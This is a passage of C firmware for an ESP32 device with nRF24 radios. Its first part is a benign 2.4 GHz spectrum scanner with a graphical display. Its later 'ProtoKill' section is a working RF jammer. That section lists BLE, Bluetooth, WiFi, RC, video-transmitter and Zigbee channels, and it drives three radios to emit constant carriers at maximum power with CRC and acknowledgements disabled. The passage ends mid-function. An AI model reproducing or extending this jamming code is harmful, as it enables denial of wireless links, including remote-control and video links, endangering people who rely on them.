        Scanner_scanning = false;
        Scanner_Print(TEXT("Scan interrupted by user"), UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        Scanner_scanning = false;
        return;
      }

      Scanner_setRegister(_NRF24_RF_CH, (uint8_t)i);
      Scanner_enable();
      esp_rom_delay_us(Scanner_RX_SETTLE_US + Scanner_RPD_DWELL_US);
      Scanner_disable();
      if (Scanner_carrierDetected()) Scanner_channel[i]++;

      uint32_t now = sys_monotonic_ms();
      if (now - lastUI >= Scanner_UI_THROTTLE_MS) {
        Scanner_runUI();
        Scanner_scannerPollNavButtons();
        lastUI = now;
        taskYIELD();
        if (feature_exit_requested || featureExitButtonPressed()) {
          Scanner_scanning = false;
          return;
        }
      } else if ((i % Scanner_BUTTON_POLL_STRIDE) == 0) {
        Scanner_scannerPollNavButtons();
      }
    }
  }
}

void Scanner_outputChannels(void) {
  int norm = 0;
  for (int i = 0; i < CHANNELS && Scanner_scanning; i++) {
    if (Scanner_channel[i] > norm) norm = Scanner_channel[i];
  }
  static uint32_t lastUI = 0;
  for (int i = 0; i < CHANNELS && Scanner_scanning; i++) {
    if ((i % Scanner_BUTTON_POLL_STRIDE) == 0 &&
        Scanner_isSelectButtonPressed()) {
      Scanner_scanning = false;
      Scanner_Print(TEXT("Output interrupted by user"), UI_WARN, true);
      return;
    }
    int strength = (norm != 0) ? (Scanner_channel[i] * 10) / norm : 0;
    (void)strength;
    Scanner_channel[i] = 0;
    uint32_t now = sys_monotonic_ms();
    if (now - lastUI >= Scanner_UI_THROTTLE_MS) {
      Scanner_runUI();
      Scanner_scannerPollNavButtons();
      lastUI = now;
      taskYIELD();
    } else if ((i % Scanner_BUTTON_POLL_STRIDE) == 0) {
      Scanner_scannerPollNavButtons();
    }
  }
}

typedef struct Scanner_ScannerPlotLayout {
  int graphTop;
  int axisX;
  int plotRight;
  int plotTop;
  int plotBottom;
  int plotHeight;
  int plotWidth;
  int maxBarHeight;
  bool valid;
} Scanner_ScannerPlotLayout;
#define Scanner_ScannerPlotLayout_INITIALIZER \
  {.graphTop = 0,                             \
   .axisX = 10,                               \
   .plotRight = 0,                            \
   .plotTop = 0,                              \
   .plotBottom = 0,                           \
   .plotHeight = 0,                           \
   .plotWidth = 0,                            \
   .maxBarHeight = 0,                         \
   .valid = false}
;

static Scanner_ScannerPlotLayout Scanner_s_plot =
    Scanner_ScannerPlotLayout_INITIALIZER;
static uint8_t Scanner_s_smoothValues[N];
static uint8_t Scanner_s_prevBarPx[N];
static bool Scanner_s_graphChromeDrawn = false;
static int Scanner_s_lastPeakCh = -1;
static uint8_t Scanner_s_lastPeakVal = 0;
static int Scanner_s_peakMarkerX = -1;
static int Scanner_s_statusPeakCh = -1;
static uint8_t Scanner_s_statusPeakVal = 0;
static int Scanner_s_statusActive = -1;
static int Scanner_s_statusPctBucket = -1;
static uint32_t Scanner_s_lastStatusDrawMs = 0;
enum {
  Scanner_s_statusLineText_COUNT = Scanner_kScannerStatusLineCount,
  Scanner_s_statusLineText_OFFSET = Scanner_Buffer_OFFSET + Scanner_Buffer_COUNT
};
_Static_assert(Scanner_s_statusLineText_OFFSET +
                       Scanner_s_statusLineText_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define Scanner_s_statusLineText                  \
  (*(text_t(*)[Scanner_s_statusLineText_COUNT]) & \
   feature_text_slots[Scanner_s_statusLineText_OFFSET])
static uint16_t Scanner_s_statusLineColor[Scanner_kScannerStatusLineCount];
static bool Scanner_s_statusStaticDrawn = false;

static int Scanner_scannerBarCol0X(void) {
  const int barsSpan =
      (Scanner_kScannerBarsPerCol * 2) + Scanner_kScannerBarColGap;
  return Scanner_s_plot.axisX +
         DIV_MAX(0, (Scanner_s_plot.plotWidth - barsSpan) / 2);
}

static int Scanner_scannerBarX(int ch) {
  const int col0 = Scanner_scannerBarCol0X();
  if (ch < Scanner_kScannerBarsPerCol) {
    return col0 + ch;
  }
  return col0 + Scanner_kScannerBarsPerCol + Scanner_kScannerBarColGap +
         (ch - Scanner_kScannerBarsPerCol);
}

enum { Scanner_kScannerGridDivisions = 4 };
enum { Scanner_kScannerMinBarPx = 5 };

static int Scanner_scannerHorizGridY(int lineIndex) {
  return Scanner_s_plot.plotTop + ((Scanner_s_plot.plotHeight * lineIndex) +
                                   (Scanner_kScannerGridDivisions / 2)) /
                                      Scanner_kScannerGridDivisions;
}

static void Scanner_scannerDrawHorizGridLines(void) {
  for (int g = 1; g < Scanner_kScannerGridDivisions; g++) {
    const int gy = Scanner_scannerHorizGridY(g);
    display_draw_fast_h_line(&(tft), Scanner_s_plot.axisX + 1, gy,
                             Scanner_s_plot.plotWidth - 2, 0x2945);
  }
}

static void Scanner_scannerDrawVertGridLines(void) {
  for (int v = 1; v < Scanner_kScannerGridDivisions; v++) {
    const int vx =
        Scanner_s_plot.axisX +
        ((Scanner_s_plot.plotWidth * v) + (Scanner_kScannerGridDivisions / 2)) /
            Scanner_kScannerGridDivisions;
    display_draw_fast_v_line(&(tft), vx, Scanner_s_plot.plotTop + 1,
                             Scanner_s_plot.plotHeight - 2, 0x2945);
  }
}

static void Scanner_scannerResetGraphState(void) {
  Scanner_s_graphChromeDrawn = false;
  Scanner_s_plot.valid = false;
  memset(Scanner_s_smoothValues, 0, sizeof(Scanner_s_smoothValues));
  memset(Scanner_s_prevBarPx, 0, sizeof(Scanner_s_prevBarPx));
  memset(Scanner_values, 0, sizeof(Scanner_values));
  Scanner_s_lastPeakCh = -1;
  Scanner_s_lastPeakVal = 0;
  Scanner_s_peakMarkerX = -1;
  Scanner_s_statusPeakCh = -1;
  Scanner_s_statusPeakVal = 0;
  Scanner_s_statusActive = -1;
  Scanner_s_statusPctBucket = -1;
  Scanner_s_lastStatusDrawMs = 0;
  Scanner_s_statusStaticDrawn = false;
  for (int i = 0; i < Scanner_kScannerStatusLineCount; i++) {
    Scanner_s_statusLineText[i] = TEXT("");
    Scanner_s_statusLineColor[i] = 0;
  }
}

static void Scanner_scannerRestoreColumnDecor(int x) {
  if (!Scanner_s_plot.valid) {
    return;
  }
  for (int g = 1; g < Scanner_kScannerGridDivisions; g++) {
    const int gy = Scanner_scannerHorizGridY(g);
    if (gy > Scanner_s_plot.plotTop && gy < Scanner_s_plot.plotBottom) {
      display_draw_pixel(&(tft), x, gy, 0x2945);
    }
  }
  for (int v = 1; v < Scanner_kScannerGridDivisions; v++) {
    const int vx =
        Scanner_s_plot.axisX +
        ((Scanner_s_plot.plotWidth * v) + (Scanner_kScannerGridDivisions / 2)) /
            Scanner_kScannerGridDivisions;
    if (vx == x) {
      display_draw_fast_v_line(&(tft), vx, Scanner_s_plot.plotTop + 1,
                               Scanner_s_plot.plotHeight - 2, 0x2945);
      break;
    }
  }
}

static void Scanner_scannerEnsurePlotLayout(void) {
  const int screenW = display_width(&(tft));
  Scanner_s_plot.graphTop = Scanner_kScannerGraphTop;
  Scanner_s_plot.axisX = Scanner_kScannerGraphMarginX;
  Scanner_s_plot.plotRight = screenW - Scanner_kScannerGraphMarginX;
  Scanner_s_plot.plotTop = Scanner_s_plot.graphTop + 12;
  Scanner_s_plot.plotBottom = bleContentBottom() - 13;
  Scanner_s_plot.plotHeight =
      Scanner_s_plot.plotBottom - Scanner_s_plot.plotTop;
  Scanner_s_plot.plotWidth = Scanner_s_plot.plotRight - Scanner_s_plot.axisX;
  Scanner_s_plot.maxBarHeight = Scanner_s_plot.plotHeight;
  Scanner_s_plot.valid =
      Scanner_s_plot.plotWidth >= 32 && Scanner_s_plot.plotHeight >= 10;
}

static void Scanner_scannerDrawGraphChrome(void) {
  Scanner_scannerEnsurePlotLayout();
  if (!Scanner_s_plot.valid) {
    return;
  }

  const int screenW = display_width(&(tft));
  const int graphBottom = bleContentBottom() - 2;
  display_fill_rect(&(tft), 0, Scanner_kScannerLogBottom, screenW,
                    graphBottom - Scanner_kScannerLogBottom + 2, TFT_BLACK);
  display_fill_rect(&(tft), Scanner_s_plot.axisX, Scanner_s_plot.plotTop,
                    Scanner_s_plot.plotWidth, Scanner_s_plot.plotHeight,
                    0x0842);

  Scanner_scannerDrawHorizGridLines();
  Scanner_scannerDrawVertGridLines();

  display_draw_rect(&(tft), Scanner_s_plot.axisX, Scanner_s_plot.plotTop,
                    Scanner_s_plot.plotWidth, Scanner_s_plot.plotHeight,
                    UI_LINE);
  display_draw_line(&(tft), Scanner_s_plot.axisX, Scanner_s_plot.plotTop,
                    Scanner_s_plot.axisX, Scanner_s_plot.plotBottom, WHITE);
  display_draw_line(&(tft), Scanner_s_plot.axisX, Scanner_s_plot.plotBottom,
                    Scanner_s_plot.plotRight, Scanner_s_plot.plotBottom, WHITE);

  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_draw_string(&(tft), "2.4 GHz Spectrum", (screenW - 96) / 2,
                      Scanner_s_plot.graphTop + 2, 0);

  const int labelY = Scanner_s_plot.plotBottom + 2;
  display_draw_string(&(tft), "2.40", Scanner_s_plot.axisX + 2, labelY, 0);
  display_draw_string(&(tft), "2.45",
                      Scanner_s_plot.axisX + Scanner_s_plot.plotWidth / 3 - 8,
                      labelY, 0);
  display_draw_string(
      &(tft), "2.50",
      Scanner_s_plot.axisX + (Scanner_s_plot.plotWidth * 2) / 3 - 8, labelY, 0);
  display_draw_string(&(tft), "2.52G", Scanner_s_plot.plotRight - 30, labelY,
                      0);

  Scanner_s_graphChromeDrawn = true;
  memset(Scanner_s_prevBarPx, 0, sizeof(Scanner_s_prevBarPx));
  Scanner_s_lastPeakCh = -1;
  Scanner_s_lastPeakVal = 0;
  Scanner_s_peakMarkerX = -1;
}

static void Scanner_scannerFindPeak(const uint8_t* vals, int count, int* peakCh,
                                    uint8_t* peakVal) {
  (*peakCh) = 0;
  (*peakVal) = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] > (*peakVal)) {
      (*peakVal) = vals[i];
      (*peakCh) = i;
    }
  }
}

static text_t Scanner_scannerChannelGHzText(int ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return TEXT(buf);
}

static text_t Scanner_scannerBandHint(int ch) {
  if (ch == 2 || ch == 26 || ch == 80) {
    return TEXT("BLE");
  }
  if (ch >= 10 && ch <= 15) {
    return TEXT("WiFi Ch1");
  }
  if (ch >= 34 && ch <= 40) {
    return TEXT("WiFi Ch6");
  }
  if (ch >= 59 && ch <= 65) {
    return TEXT("WiFi Ch11");
  }
  if (ch >= 76 && ch <= 86) {
    return TEXT("RC/Video");
  }
  return TEXT("ISM");
}

static text_t Scanner_scannerChannelBandLine(int ch) {
  char line[32];
  snprintf(line, sizeof(line), "Ch %d  %.16s", ch,
           (Scanner_scannerBandHint(ch)).data);
  return TEXT(line);
}

static text_t Scanner_scannerFitStatusText(text_t text) {
  const int maxWidth = display_width(&(tft)) - 16;
  display_set_text_size(&(tft), 1);
  if (display_text_width(&(tft), (text).data, 0) <= maxWidth) {
    return text;
  }
  text_t out = text;
  while (strlen((out).data) > 1 &&
         display_text_width(&(tft), (text_join_cstr((out).data, "...")).data,
                            0) > maxWidth) {
    text_erase(&(out), strlen((out).data) - 1, SIZE_MAX);
  }
  if (!(strlen((out).data) == 0)) {
    text_append_cstr(&(out), "...");
  }
  return out;
}

static int Scanner_scannerCountActiveChannels(const uint8_t* vals, int count) {
  int active = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] >= 3) {
      active++;
    }
  }
  return active;
}

static void Scanner_scannerDrawStatusLine(int line, text_t text,
                                          uint16_t color) {
  const int y = Scanner_kScannerStatusTextY + line * LINE_HEIGHT;
  text_t fitted = Scanner_scannerFitStatusText(text);
  display_fill_rect(&(tft), 8, y, display_width(&(tft)) - 16, LINE_HEIGHT,
                    TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), 8, y);
  display_print(&(tft), (fitted).data);
}

static void Scanner_scannerDrawStatusLineIfChanged(int line, text_t text,
                                                   uint16_t color) {
  if (line < 0 || line >= Scanner_kScannerStatusLineCount) {
    return;
  }
  if ((strcmp((Scanner_s_statusLineText[line]).data, (text).data) == 0) &&
      Scanner_s_statusLineColor[line] == color) {
    return;
  }
  Scanner_s_statusLineText[line] = text;
  Scanner_s_statusLineColor[line] = color;
  Scanner_scannerDrawStatusLine(line, text, color);
}

static void Scanner_scannerDrawTextBoxes(void) {
  display_fill_rect(
      &(tft), 0, Scanner_kScannerStatusY - 2, display_width(&(tft)),
      Scanner_kScannerLogBottom - Scanner_kScannerStatusY + 2, TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_round_rect(&(tft), 4, Scanner_kScannerStatusY,
                          display_width(&(tft)) - 8, Scanner_kScannerStatusBoxH,
                          3, UI_LINE);
  display_draw_round_rect(&(tft), 4, Scanner_kScannerLogBoxTop,
                          display_width(&(tft)) - 8, Scanner_kScannerLogBoxH, 3,
                          UI_LINE);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_draw_string(&(tft), "RF Status", 8, Scanner_kScannerStatusY + 3, 0);
  display_draw_string(&(tft), "Activity", 8, Scanner_kScannerLogBoxTop + 3, 0);
}

static void Scanner_scannerDrawStaticStatusLines(void) {
  if (Scanner_s_statusStaticDrawn) {
    return;
  }
  Scanner_scannerDrawStatusLineIfChanged(
      4, TEXT("Range: 2.4-2.528 GHz  128 ch"), UI_DIM_TEXT);
  Scanner_scannerDrawStatusLineIfChanged(5, TEXT("State: Monitoring"),
                                         UI_DIM_TEXT);
  Scanner_s_statusStaticDrawn = true;
}

static void Scanner_scannerUpdateStatusPanel(const uint8_t* vals, int count) {
  int peakCh = 0;
  uint8_t peakVal = 0;
  Scanner_scannerFindPeak(vals, count, &(peakCh), &(peakVal));
  const int active = Scanner_scannerCountActiveChannels(vals, count);

  const int pct = peakVal > 0 ? DIV_MIN(100, ((int)peakVal * 100) / 64) : 0;
  const int pctBucket = pct / 3;
  const uint32_t now = sys_monotonic_ms();
  if (peakCh == Scanner_s_statusPeakCh &&
      pctBucket == Scanner_s_statusPctBucket &&
      active == Scanner_s_statusActive &&
      now - Scanner_s_lastStatusDrawMs < 200) {
    return;
  }
  Scanner_s_statusPeakCh = peakCh;
  Scanner_s_statusPeakVal = peakVal;
  Scanner_s_statusActive = active;
  Scanner_s_statusPctBucket = pctBucket;
  Scanner_s_lastStatusDrawMs = now;

  Scanner_scannerDrawStaticStatusLines();

  if (peakVal == 0) {
    Scanner_scannerDrawStatusLineIfChanged(0, TEXT("Peak: none"), UI_DIM_TEXT);
    Scanner_scannerDrawStatusLineIfChanged(1, TEXT("Ch --  --"), UI_DIM_TEXT);
    Scanner_scannerDrawStatusLineIfChanged(2, TEXT("Strength: 0%"),
                                           UI_DIM_TEXT);
  } else {
    Scanner_scannerDrawStatusLineIfChanged(
        0,
        text_join_cstr(
            (text_join_cstr("Peak: ",
                            (Scanner_scannerChannelGHzText(peakCh)).data))
                .data,
            " GHz"),
        UI_TEXT);
    Scanner_scannerDrawStatusLineIfChanged(
        1, Scanner_scannerChannelBandLine(peakCh), UI_TEXT);
    Scanner_scannerDrawStatusLineIfChanged(
        2,
        text_join_cstr((text_join_cstr("Strength: ", (TEXT(pct)).data)).data,
                       "%"),
        UI_TEXT);
  }

  Scanner_scannerDrawStatusLineIfChanged(
      3,
      text_join_cstr((text_join_cstr("Active: ", (TEXT(active)).data)).data,
                     " channel(s)"),
      active > 0 ? UI_OK : UI_DIM_TEXT);
}

static void Scanner_scannerClearPeakMarker(void) {
  if (!Scanner_s_plot.valid || Scanner_s_peakMarkerX < 0) {
    return;
  }
  display_draw_pixel(&(tft), Scanner_s_peakMarkerX, Scanner_s_plot.plotTop + 1,
                     0x0842);
  Scanner_s_peakMarkerX = -1;
}

static void Scanner_scannerUpdatePeakMarker(const uint8_t* vals, int count) {
  if (!Scanner_s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  Scanner_scannerFindPeak(vals, count, &(peakCh), &(peakVal));

  if (peakCh == Scanner_s_lastPeakCh && peakVal == Scanner_s_lastPeakVal) {
    return;
  }
  Scanner_s_lastPeakCh = peakCh;
  Scanner_s_lastPeakVal = peakVal;

  Scanner_scannerClearPeakMarker();
  if (peakVal == 0) {
    return;
  }

  const int markerX = Scanner_scannerBarX(peakCh);
  display_draw_pixel(&(tft), markerX, Scanner_s_plot.plotTop + 1, WHITE);
  Scanner_s_peakMarkerX = markerX;
}

static void Scanner_scannerUpdateBarColumn(int ch, int newPx, int oldPx) {
  if (!Scanner_s_plot.valid) {
    return;
  }
  const int x = Scanner_scannerBarX(ch);
  const uint16_t bg = 0x0842;

  if (newPx < oldPx) {
    display_fill_rect(&(tft), x, Scanner_s_plot.plotBottom - oldPx, 1,
                      oldPx - newPx, bg);
    Scanner_scannerRestoreColumnDecor(x);
  }
  if (newPx > oldPx) {
    display_fill_rect(&(tft), x, Scanner_s_plot.plotBottom - newPx, 1,
                      newPx - oldPx, UI_WARN);
  }
  Scanner_s_prevBarPx[ch] = (uint8_t)newPx;
}

static void Scanner_scannerSmoothFrame(const uint8_t* frameHits, int count) {
  for (int i = 0; i < count; i++) {
    if (frameHits[i] > 0) {
      int blended =
          (((int)Scanner_s_smoothValues[i] * 3) + ((int)frameHits[i] * 5)) / 8;
      if (blended < (int)frameHits[i]) {
        blended = frameHits[i];
      }
      Scanner_s_smoothValues[i] = (uint8_t)DIV_MIN(255, blended);
    } else if (Scanner_s_smoothValues[i] > 2) {
      Scanner_s_smoothValues[i] =
          (uint8_t)(((int)Scanner_s_smoothValues[i] * 7) / 8);
    } else if (Scanner_s_smoothValues[i] > 0) {
      Scanner_s_smoothValues[i]--;
    }
  }
}

static int Scanner_scannerValueToBarPx(uint8_t val, uint8_t peakVal) {
  if (val == 0 || !Scanner_s_plot.valid || Scanner_s_plot.maxBarHeight <= 0) {
    return 0;
  }

  const int maxH = Scanner_s_plot.maxBarHeight;
  if (peakVal == 0 || val >= peakVal) {
    return DIV_MIN(maxH, DIV_MAX(Scanner_kScannerMinBarPx, (int)val));
  }

  const int span = maxH - Scanner_kScannerMinBarPx;
  int scaled = Scanner_kScannerMinBarPx + (span * (int)val) / (int)peakVal;
  return DIV_MIN(maxH, DIV_MAX(Scanner_kScannerMinBarPx, scaled));
}

static void Scanner_scannerUpdateBars(const uint8_t* vals, int count) {
  if (!Scanner_s_graphChromeDrawn) {
    Scanner_scannerDrawGraphChrome();
  }
  if (!Scanner_s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  Scanner_scannerFindPeak(vals, count, &(peakCh), &(peakVal));

  for (int i = 0; i < count; i++) {
    const int newPx = Scanner_scannerValueToBarPx(vals[i], peakVal);
    const int oldPx = Scanner_s_prevBarPx[i];
    if (newPx != oldPx) {
      Scanner_scannerUpdateBarColumn(i, newPx, oldPx);
    }
  }
}

void Scanner_display(void) {
  if (!Scanner_scanning) {
    return;
  }

  uint8_t frameHits[N];
  memset(frameHits, 0, sizeof(frameHits));

  Scanner_disable();
  static uint32_t lastNavPoll = 0;
  for (int pass = 0; pass < (int)Scanner_DISPLAY_SWEEPS && Scanner_scanning;
       ++pass) {
    for (int i = 0; i < N && Scanner_scanning; ++i) {
      if ((i % Scanner_BUTTON_POLL_STRIDE) == 0 &&
          Scanner_isSelectButtonPressed()) {
        Scanner_scanning = false;
        Scanner_Print(TEXT("Display interrupted by user"), UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        return;
      }

      Scanner_setRegister(_NRF24_RF_CH, (uint8_t)i);
      Scanner_enable();
      esp_rom_delay_us(Scanner_RX_SETTLE_US + Scanner_RPD_DWELL_US);
      Scanner_disable();
      if (Scanner_carrierDetected()) {
        frameHits[i]++;
      }

      const uint32_t now = sys_monotonic_ms();
      if (now - lastNavPoll >= Scanner_UI_THROTTLE_MS) {
        Scanner_scannerPollNavButtons();
        lastNavPoll = now;
      } else if ((i % Scanner_BUTTON_POLL_STRIDE) == 0) {
        Scanner_scannerPollNavButtons();
      }
    }
  }

  Scanner_scannerSmoothFrame(frameHits, N);
  Scanner_scannerUpdateBars(Scanner_s_smoothValues, N);
  Scanner_scannerUpdatePeakMarker(Scanner_s_smoothValues, N);
  Scanner_scannerUpdateStatusPanel(Scanner_s_smoothValues, N);
}

void Scanner_scannerSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetScannerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  Scanner_uiDrawn = false;
  Scanner_scannerResetGraphState();
  Scanner_scannerDrawGraphChrome();

  setupTouchscreen();

  Scanner_scannerDrawTextBoxes();
  Scanner_scannerDrawStatusLineIfChanged(0, TEXT("Peak: scanning..."),
                                         UI_DIM_TEXT);
  Scanner_scannerDrawStatusLineIfChanged(1, TEXT("Ch --  --"), UI_DIM_TEXT);
  Scanner_scannerDrawStatusLineIfChanged(2, TEXT("Strength: --"), UI_DIM_TEXT);
  Scanner_scannerDrawStatusLineIfChanged(3, TEXT("Active: 0 channel(s)"),
                                         UI_DIM_TEXT);
  Scanner_scannerDrawStaticStatusLines();
  Scanner_Print(TEXT("[+] Scanner ready"), UI_WARN, false);
  redrawTouchButtonBar();

  rf24_begin(&(Scanner_spectrum_radio));

  sys_configure_gpio(CE, GPIO_MODE_OUTPUT);
  sys_configure_gpio(CSN, GPIO_MODE_OUTPUT);

  Scanner_disable();
  Scanner_powerUp();

  Scanner_setRegister(_NRF24_CONFIG, Scanner_getRegister(_NRF24_CONFIG) | 0x03);
  esp_rom_delay_us(130);
  Scanner_setRegister(_NRF24_EN_AA, 0x0);
  Scanner_setRegister(_NRF24_RF_SETUP, 0x0F);

  Scanner_scanning = true;
}

void Scanner_scannerLoop(void) {
  Scanner_scanning = true;
  while (Scanner_scanning) {
    if (feature_active &&
        (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      Scanner_scanning = false;
      break;
    }

    Scanner_scannerPollNavButtons();
    Scanner_runUI();
    Scanner_scanChannels();
    Scanner_outputChannels();
    Scanner_display();
    sys_sleep_ms(2);
  }
}

rf24_t ProtoKill_radio1 = {.cePin_ = CE_PIN_1,
                           .csnPin_ = CSN_PIN_1,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};
rf24_t ProtoKill_radio2 = {.cePin_ = CE_PIN_2,
                           .csnPin_ = CSN_PIN_2,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};
rf24_t ProtoKill_radio3 = {.cePin_ = CE_PIN_3,
                           .csnPin_ = CSN_PIN_3,
                           .spiSpeed_ = 16000000,
                           .payloadSize_ = 32,
                           .addrWidth_ = 5};

typedef enum ProtoKill_OperationMode {
  ProtoKill_BLE_MODULE,
  ProtoKill_Bluetooth_MODULE,
  ProtoKill_WiFi_MODULE,
  ProtoKill_VIDEO_TX_MODULE,
  ProtoKill_RC_MODULE,
  ProtoKill_USB_WIRELESS_MODULE,
  ProtoKill_ZIGBEE_MODULE,
  ProtoKill_NRF24_MODULE
} ProtoKill_OperationMode;
ProtoKill_OperationMode ProtoKill_currentMode = ProtoKill_WiFi_MODULE;

bool ProtoKill_jammerActive = false;

const uint8_t ProtoKill_bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0,
                                                1,  2,  4,  6,  8,  22, 24,
                                                26, 28, 30, 74, 76, 78, 80};
const uint8_t ProtoKill_ble_channels[] = {2, 26, 80};
const uint8_t ProtoKill_WiFi_channels[] = {1, 2, 3, 4,  5,  6,
                                           7, 8, 9, 10, 11, 12};
const uint8_t ProtoKill_usbWireless_channels[] = {40, 50, 60};
const uint8_t ProtoKill_videoTransmitter_channels[] = {70, 75, 80};
const uint8_t ProtoKill_rc_channels[] = {1, 3, 5, 7};
const uint8_t ProtoKill_zigbee_channels[] = {11, 15, 20, 25};
const uint8_t ProtoKill_nrf24_channels[] = {76, 78, 79};

const uint8_t ProtoKill_BLE_channels[] = {2, 26, 80};
uint8_t ProtoKill_channelGroup1[] = {2, 5, 8, 11};
uint8_t ProtoKill_channelGroup2[] = {26, 29, 32, 35};
uint8_t ProtoKill_channelGroup3[] = {80, 83, 86, 89};

#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT
#undef LINE_HEIGHT
#define LINE_HEIGHT 12
#undef MAX_LINES
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

enum { ProtoKill_Buffer_COUNT = MAX_LINES, ProtoKill_Buffer_OFFSET = 0 };
_Static_assert(ProtoKill_Buffer_OFFSET + ProtoKill_Buffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define ProtoKill_Buffer                  \
  (*(text_t(*)[ProtoKill_Buffer_COUNT]) & \
   feature_text_slots[ProtoKill_Buffer_OFFSET])
uint16_t ProtoKill_Buffercolor[MAX_LINES];
int ProtoKill_Index = 0;

volatile bool ProtoKill_modeChangeRequested = false;
volatile bool ProtoKill_modeChangeRequested1 = false;
volatile bool ProtoKill_jammerToggleRequested = false;

enum { ProtoKill_kProkillLogTop = 48 };

static int ProtoKill_prokillVisibleLines(void) {
  return bleMaxLinesInZone(ProtoKill_kProkillLogTop, LINE_HEIGHT);
}

static bool ProtoKill_prokillLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

static void ProtoKill_prokillRedrawLogLine(int bufIndex) {
  const int visibleLines = ProtoKill_prokillVisibleLines();
  if (bufIndex < 0 || bufIndex >= visibleLines) {
    return;
  }
  const int yPos = (bufIndex * LINE_HEIGHT) + ProtoKill_kProkillLogTop;
  if (!ProtoKill_prokillLineFits(yPos)) {
    return;
  }

  display_fill_rect(&(tft), 5, yPos, display_width(&(tft)) - 10, LINE_HEIGHT,
                    TFT_BLACK);
  display_set_text_color_2(&(tft), ProtoKill_Buffercolor[bufIndex], TFT_BLACK);
  display_set_cursor(&(tft), 5, yPos);
  display_print(&(tft), (ProtoKill_Buffer[bufIndex]).data);
}

static void ProtoKill_prokillRedrawAllLog(void) {
  const int visibleLines = ProtoKill_prokillVisibleLines();
  for (int i = 0; i < ProtoKill_Index && i < visibleLines; i++) {
    ProtoKill_prokillRedrawLogLine(i);
  }
}

void ProtoKill_Print(text_t text, uint16_t color, bool extraSpace) {
  const int visibleLines = ProtoKill_prokillVisibleLines();
  const bool scrolled = (ProtoKill_Index >= visibleLines);
  if (scrolled) {
    for (int i = 0; i < visibleLines - 1; i++) {
      ProtoKill_Buffer[i] = ProtoKill_Buffer[i + 1];
      ProtoKill_Buffercolor[i] = ProtoKill_Buffercolor[i + 1];
    }
    ProtoKill_Index = visibleLines - 1;
  }

  const int firstNewIndex = ProtoKill_Index;
  ProtoKill_Buffer[ProtoKill_Index] = text;
  ProtoKill_Buffercolor[ProtoKill_Index] = color;
  ProtoKill_Index++;

  if (extraSpace && ProtoKill_Index < visibleLines) {
    ProtoKill_Buffer[ProtoKill_Index] = TEXT("");
    ProtoKill_Buffercolor[ProtoKill_Index] = WHITE;
    ProtoKill_Index++;
  }

  if (scrolled) {
    ProtoKill_prokillRedrawAllLog();
    return;
  }

  for (int i = firstNewIndex; i < ProtoKill_Index; i++) {
    ProtoKill_prokillRedrawLogLine(i);
  }
}

void ProtoKill_prokillHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    ProtoKill_jammerToggleRequested = true;
    bleWaitButtonRelease(BTN_UP);
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    ProtoKill_modeChangeRequested = true;
    bleWaitButtonRelease(BTN_RIGHT);
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    ProtoKill_modeChangeRequested1 = true;
    bleWaitButtonRelease(BTN_LEFT);
  }
}

void ProtoKill_configureRadio(rf24_t* radio, const uint8_t* channels,
                              size_t size) {
  rf24_set_auto_ack_1(&((*radio)), false);
  rf24_stop_listening(&((*radio)));
  rf24_set_retries(&((*radio)), 0, 0);
  rf24_set_pa_level(&((*radio)), RF24_PA_MAX, true);
  rf24_set_data_rate(&((*radio)), RF24_2MBPS);
  rf24_set_crc_length(&((*radio)), RF24_CRC_DISABLED);
  rf24_print_pretty_details(&((*radio)));

  for (size_t i = 0; i < size; i++) {
    rf24_set_channel(&((*radio)), channels[i]);
    rf24_start_const_carrier(&((*radio)), RF24_PA_MAX, channels[i]);
  }
}

void ProtoKill_initializeRadiosMultiMode(void) {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (rf24_begin(&(ProtoKill_radio1))) {
    ProtoKill_configureRadio(&(ProtoKill_radio1), ProtoKill_channelGroup1,
                             sizeof(ProtoKill_channelGroup1));
    radio1Active = true;
  }
  if (rf24_begin(&(ProtoKill_radio2))) {
    ProtoKill_configureRadio(&(ProtoKill_radio2), ProtoKill_channelGroup2,
                             sizeof(ProtoKill_channelGroup2));
    radio2Active = true;
  }
  if (rf24_begin(&(ProtoKill_radio3))) {
    ProtoKill_configureRadio(&(ProtoKill_radio3), ProtoKill_channelGroup3,
                             sizeof(ProtoKill_channelGroup3));
    radio3Active = true;
  }
}

void ProtoKill_initializeRadios(void) {
  if (ProtoKill_jammerActive) {
    ProtoKill_initializeRadiosMultiMode();

  } else {
    rf24_power_down(&(ProtoKill_radio1));
